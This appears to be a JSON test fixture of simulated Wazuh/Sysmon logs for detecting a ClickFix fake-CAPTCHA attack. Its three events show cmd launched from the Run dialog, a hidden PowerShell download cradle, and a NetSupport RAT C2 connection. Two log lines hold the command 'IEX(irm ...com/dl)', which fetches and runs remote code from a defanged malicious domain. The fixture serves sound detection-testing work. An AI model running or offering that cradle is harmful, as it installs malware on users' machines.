{
  "_metadata": {
    "attack_id": "T1059.001",
    "variation": "002",
    "name": "IClickFix/ClearFake ClickFix Clipboard PowerShell",
    "description": "Simulates ClickFix social engineering attack where user copies malicious PowerShell from fake CAPTCHA to run dialog",
    "expected_detection": "HIGH",
    "kill_chain_phase": "execution",
    "source_url": "https://blog.sekoia.io/meet-iclickfix-a-widespread-wordpress-targeting-framework-using-the-clickfix-tactic/",
    "format": "wazuh-native",
    "format_version": "1.0"
  },
  "logs": [
    {
      "_comment": "Sysmon Event 1 - cmd.exe launched from Run dialog (Win+R)",
      "sequence": 1,
      "timestamp": "2026-02-03T11:00:00.000Z",
      "log": {
        "rule": {
          "level": 10,
          "description": "Sysmon - Event 1: cmd.exe launched via Run dialog",
          "id": "100916",
          "mitre": {
            "id": [
              "T1204.002"
            ],
            "tactic": [
              "Execution"
            ],
            "technique": [
              "User Execution: Malicious File"
            ]
          },
          "groups": [
            "sysmon",
            "sysmon_event1",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000004.000001",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "1",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local"
            },
            "eventdata": {
              "utcTime": "2026-02-03 11:00:00.000",
              "processGuid": "{4DC16835-DA1B-65B0-B100-000000001500}",
              "processId": "6128",
              "image": "C:\\Windows\\System32\\cmd.exe",
              "commandLine": "cmd /c powershell -w hidden -c \"IEX(irm ototaikfffkf[.]com/dl)\"",
              "currentDirectory": "C:\\Windows\\system32\\",
              "user": "CORP\\victim",
              "integrityLevel": "Medium",
              "parentProcessGuid": "{4DC16835-DA0A-65B0-B000-000000001500}",
              "parentProcessId": "1568",
              "parentImage": "C:\\Windows\\explorer.exe"
            }
          }
        },
        "_fomorian_test": true,
        "_fomorian_attack_id": "T1204.002",
        "_fomorian_batch": "morning-intel-20260203"
      }
    },
    {
      "_comment": "Sysmon Event 1 - Hidden PowerShell with download cradle",
      "sequence": 2,
      "timestamp": "2026-02-03T11:00:05.000Z",
      "log": {
        "rule": {
          "level": 14,
          "description": "Sysmon - Event 1: Suspicious hidden PowerShell download cradle",
          "id": "100916",
          "mitre": {
            "id": [
              "T1059.001",
              "T1105"
            ],
            "tactic": [
              "Execution",
              "Command and Control"
            ],
            "technique": [
              "Command and Scripting Interpreter: PowerShell",
              "Ingress Tool Transfer"
            ]
          },
          "groups": [
            "sysmon",
            "sysmon_event1",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000004.000002",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "1",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local"
            },
            "eventdata": {
              "utcTime": "2026-02-03 11:00:05.000",
              "processGuid": "{4DC16835-DA2C-65B0-B200-000000001500}",
              "processId": "6456",
              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "commandLine": "powershell -w hidden -c \"IEX(irm ototaikfffkf[.]com/dl)\"",
              "currentDirectory": "C:\\Windows\\system32\\",
              "user": "CORP\\victim",
              "integrityLevel": "Medium",
              "parentProcessGuid": "{4DC16835-DA1B-65B0-B100-000000001500}",
              "parentProcessId": "6128",
              "parentImage": "C:\\Windows\\System32\\cmd.exe"
            }
          }
        },
        "_fomorian_test": true,
        "_fomorian_attack_id": "T1059.001",
        "_fomorian_batch": "morning-intel-20260203"
      }
    },
    {
      "_comment": "Sysmon Event 3 - NetSupport RAT C2 connection",
      "sequence": 3,
      "timestamp": "2026-02-03T11:00:30.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 3: NetSupport RAT network connection",
          "id": "100918",
          "mitre": {
            "id": [
              "T1071.001"
            ],
            "tactic": [
              "Command and Control"
            ],
            "technique": [
              "Application Layer Protocol: Web Protocols"
            ]
          },
          "groups": [
            "sysmon",
            "sysmon_event3",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000004.000003",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "3",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local"
            },
            "eventdata": {
              "utcTime": "2026-02-03 11:00:30.000",
              "processGuid": "{4DC16835-DA3D-65B0-B300-000000001500}",
              "processId": "7012",
              "image": "C:\\Users\\victim\\AppData\\Local\\Temp\\client32.exe",
              "user": "CORP\\victim",
              "protocol": "tcp",
              "initiated": "true",
              "sourceIp": "198.51.100.20",
              "sourcePort": "51234",
              "destinationIp": "185.234.73.46",
              "destinationPort": "443",
              "destinationHostname": "ototaikfffkf.com"
            }
          }
        },
        "_fomorian_test": true,
        "_fomorian_attack_id": "T1071.001",
        "_fomorian_batch": "morning-intel-20260203"
      }
    }
  ]
}
